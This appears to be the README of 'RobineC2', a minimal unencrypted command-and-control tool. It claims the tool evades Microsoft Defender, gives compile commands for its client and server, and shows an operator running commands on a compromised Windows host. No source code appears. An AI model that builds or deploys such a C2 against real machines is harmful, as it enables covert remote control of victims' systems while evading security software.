# RobineC2

 +-+-+-+-+-+-+-+-+-+
 |R|O|B|I|N|E|-|C|2|
 +-+-+-+-+-+-+-+-+-+
                                                                                
                                                  
**Cheap and fast C2, nothing is encrypted, and sometimes going back to the basics yields some funny results.**
- Tested in a lab with Defender, and it works.
- It would probably bypass the other EDR, who knows, if you can test it tell me.
- Simple works fine sometimes.

**TODO:**
- Add more information from the compromised host and report back to the server.
- Encryption between client and server.
- Other stuff. 
  
**How to compile**

```
cl client.cpp /EHsc /link ws2_32.lib
cl server.cpp /EHsc /link ws2_32.lib
```

```
c:\batmanismad\server.exe
Waiting for client connection...
Enter OS command to send: dir
Command Output:
 Volume in drive C has no label.
 Volume Serial Number is 1337-1337

 Directory of C:\Users\batman\Desktop

10/19/2023  01:24 PM    <DIR>          .
10/19/2023  01:24 PM    <DIR>          ..
10/16/2023  08:19 AM         1,939,696 windowsupdate.cpl
09/29/2022  08:26 PM         2,774,440 Bginfo64.exe
08/27/2023  01:50 PM             1,965 Process Lover 2.lnk
10/18/2023  08:02 AM             7,680 SharpMoneyMaker.exe
               5 File(s)      4,832,325 bytes
               2 Dir(s)  100,727,209,984 bytes free

Enter OS command to send: hostname
Command Output:
WIN10-VICTIME-BATMAN
```
